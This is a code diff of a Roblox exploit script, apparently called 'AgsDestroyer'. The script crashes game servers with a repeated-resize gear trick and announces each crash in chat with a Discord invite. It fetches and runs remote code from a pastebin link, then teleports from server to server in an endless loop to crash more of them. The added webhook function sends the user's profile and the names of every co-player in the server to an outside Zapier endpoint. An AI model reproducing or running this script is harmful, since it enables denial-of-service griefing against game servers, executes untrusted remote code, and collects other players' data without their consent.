@@ -30,75 +30,126 @@ if not game:IsLoaded() then -- Self Explanotory
         end
     end
 end
-    -- Variables:
-    local plrs = game:GetService("Players")
-    local plr = plrs.LocalPlayer
-    local nm = plr.Name
-    local char = plr.Character
-    local rs = game:getService("RunService")
-    local url = "https://hooks.zapier.com/hooks/catch/11054705/btiq4ps/" -- If you can see this, I trust you lol hope I don't regret that
-    local cmsg = nm .. " Crashed Server: " .. game.JobId .. "  Players: "
+-- Variables:
+local plrs = game:GetService("Players")
+local http = game:GetService "HttpService"
+local plr = plrs.LocalPlayer
+local nm = plr.Name
+local char = plr.Character
+local rs = game:getService("RunService")
+local url = "https://hooks.zapier.com/hooks/catch/11054705/btiq4ps/" -- If you can see this, I trust you lol hope I don't regret that
+local cmsg = nm .. " Crashed Server: " .. game.JobId .. "  Players: "
 
-    -- functions:
-    local function c(msg)
-        game:service "ReplicatedStorage".DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+-- functions:
+local function c(msg)
+    game:service "ReplicatedStorage".DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+end
+
+local function web(ps, gs)
+    function jsone(str)
+        return http:JSONEncode(str)
     end
-
-    loadstring(game:HttpGet(("https://pastebin.com/raw/bSjbj2td"), true))() -- This loads the auto pad commands, needed for non perms
-
-    pcall(
-        function()
-            -- Incase Regen doesn't exist
-            local regen = game.Workspace.Terrain["_Game"].Admin.Regen
+    function sendData(webhook)
+        local users = {}
+        for i, v in pairs(plrs:GetPlayers()) do
+            users[#users + 1] = v.Name
         end
-    )
+        users = table.concat(users, "\n")
+        local Data = {
+            ["username"] = "Crash Logger",
+            ["content"] = gs,
+            ["embeds"] = {
+                {
+                    ["author"] = {
+                        ["name"] = "Profile",
+                        ["url"] = "https://www.roblox.com/users/" .. plr.UserId .. "/profile"
+                    },
+                    ["title"] = plr.Name,
+                    ["color"] = 12583126,
+                    ["fields"] = {
+                        {
+                            ["name"] = "Server ID",
+                            ["value"] = game.JobId,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Age",
+                            ["value"] = plr.AccountAge,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "Co-Users",
+                            ["value"] = users,
+                            ["inline"] = false
+                        }
+                    }
+                }
+            }
+        }
+        game:HttpPost(url, Data)
+    end
+    sendData(ps)
+end
 
-    plrs:Chat(".pads")
-    plrs:Chat("unsize all")
-    plrs:Chat("unpunish me")
-    pcall(
-        function()
-            -- msgs:
-            c("<Bot.txt> This Server Has Been Crashed By AgsDestroyer")
-            task.wait(.35)
-            c("<Bot.txt> Join Discourd for more!")
-            task.wait(.35)
-            c("<Bot.txt> gg/9Y63Vuf8")
-            task.wait()
+loadstring(game:HttpGet(("https://pastebin.com/raw/bSjbj2td"), true))() -- This loads the auto pad commands, needed for non perms
 
-            local charadd =  -- Shades Crash
-                lp.CharacterAdded:Connect(
-                function(char)
-                    plrs:Chat("gear me 94794847")
-                    local vamp = lp.Backpack:WaitForChild("VampireVanquisher", .4)
-                    if vamp then
-                        local hum = char:WaitForChild("Humanoid", .4)
-                        if not hum then
-                            plrs:Chat("respawn me")
-                            return
-                        else
-                            hum:EquipTool(vamp)
-                        end
-                        local yield = char:WaitForChild("VampireVanquisher", .5)
-                        if not yield then
-                            plrs:Chat("respawn me")
-                            task.wait(.2)
-                            plrs:Chat("gear me 94794847")
-                            return
-                        end
-                        --Maybe add a wait() here if it is too fast
-                        for i = 1, 4 do
-                            plrs:Chat("size me .3")
-                        end
-                    else
+pcall(
+    function()
+        -- Incase Regen doesn't exist
+        local regen = game.Workspace.Terrain["_Game"].Admin.Regen
+    end
+)
+
+plrs:Chat(".pads")
+plrs:Chat("unsize all")
+plrs:Chat("unpunish me")
+pcall(
+    function()
+        -- msgs:
+        c("<Bot.txt> This Server Has Been Crashed By AgsDestroyer")
+        task.wait(.35)
+        c("<Bot.txt> Join Discourd for more!")
+        task.wait(.35)
+        c("<Bot.txt> gg/9Y63Vuf8")
+        task.wait()
+
+        local charadd = -- Shades Crash
+            lp.CharacterAdded:Connect(
+            function(char)
+                plrs:Chat("gear me 94794847")
+                local vamp = lp.Backpack:WaitForChild("VampireVanquisher", .4)
+                if vamp then
+                    local hum = char:WaitForChild("Humanoid", .4)
+                    if not hum then
                         plrs:Chat("respawn me")
+                        return
+                    else
+                        hum:EquipTool(vamp)
                     end
+                    local yield = char:WaitForChild("VampireVanquisher", .5)
+                    if not yield then
+                        plrs:Chat("respawn me")
+                        task.wait(.2)
+                        plrs:Chat("gear me 94794847")
+                        return
+                    end
+                    --Maybe add a wait() here if it is too fast
+                    for i = 1, 4 do
+                        plrs:Chat("size me .3")
+                    end
+                else
+                    plrs:Chat("respawn me")
                 end
-            )
-        end
-    ) -- ends pcall
+            end
+        )
+    end
+) -- ends pcall
 
-    wait(.1)
+wait(.1)
+web(cmsg, "User executed") -- send webhook
+
+while wait() do
+    local http
     pcall(
         function()
             local responce =
@@ -106,65 +157,19 @@ end
                 "https://games.roblox.com/v1/games/" ..
                     tostring(game.PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100"
             )
-            local http = game:GetService("HttpService"):JSONDecode(responce)
+            http = game:GetService("HttpService"):JSONDecode(responce)
         end
     )
-
     for _, server in pairs(http.data) do
-        pcall(
-            function()
-                if game.JobId == server.id then -- Checks if it's the same server
-                    if server.playing == 1 then -- finds the amount of players. Had to use all the if statements because outputting server.playing returns a error
-                        data0 = cmsg .. " 1"
-                    end
-
-                    if server.playing == 2 then
-                        data0 = cmsg .. " 2"
-                    end
-
-                    if server.playing == 3 then
-                        data0 = cmsg .. " 3"
-                    end
-
-                    if server.playing == 4 then
-                        data0 = cmsg .. " 4"
-                    end
-
-                    if server.playing == 5 then
-                        data0 = cmsg .. " 5"
-                    end
-
-                    if server.playing == 6 then
-                        data0 = cmsg .. " 6"
-                    end
-
-                    local newdata0 = game:GetService "HttpService":JSONEncode(data0)
-                    game:HttpPost(url, newdata0) -- sends webhook
-                end
-            end
-        )
-        while wait() do
-            local http
-            pcall(function()
-                    local responce =
-                        game:HttpGet(
-                        "https://games.roblox.com/v1/games/" ..
-                            tostring(game.PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100"
-                    )
-                    http = game:GetService("HttpService"):JSONDecode(responce)
-                end
-            )
-            for _, server in pairs(http.data) do
-                if game.JobId ~= server.id then -- / You don't want to rejoin the same server.
-                    if server.Playing ~= server.maxPlayers then
-                        game:GetService("TeleportService"):TeleportToPlaceInstance(
-                            game.PlaceId,
-                            server.id,
-                            game:GetService("Players").LocalPlayer
-                        )
-                        break
-                    end
-                end
+        if game.JobId ~= server.id then -- / You don't want to rejoin the same server.
+            if server.Playing ~= server.maxPlayers then
+                game:GetService("TeleportService"):TeleportToPlaceInstance(
+                    game.PlaceId,
+                    server.id,
+                    game:GetService("Players").LocalPlayer
+                )
+                break
             end
         end
     end
+end
